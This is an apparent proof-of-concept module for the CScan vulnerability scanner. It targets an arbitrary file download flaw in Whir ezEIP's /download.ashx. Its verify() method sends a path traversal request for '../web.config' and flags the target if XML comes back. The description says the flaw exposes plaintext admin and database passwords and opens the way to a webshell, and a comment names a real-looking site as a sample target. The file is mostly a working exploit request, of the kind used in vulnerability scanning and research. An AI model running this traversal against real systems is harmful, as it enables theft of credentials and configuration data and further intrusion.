# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Whir_0006'  # 平台漏洞编号，留空
    name = '万户ezEIP /download.ashx 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        万户ezEIP任意文件下载漏，可以获取管理员账号，密码明文、数据库密码明文、配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/23875.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6361bbd4-dc7f-475d-ac44-eb58a6655b12'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #target:http://www.zsty.org/
            verify_url = ('%s/download.ashx?files=../web.config') % self.target
            req = requests.get(verify_url)
            if req.status_code == 200 and '<?xml version=' in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
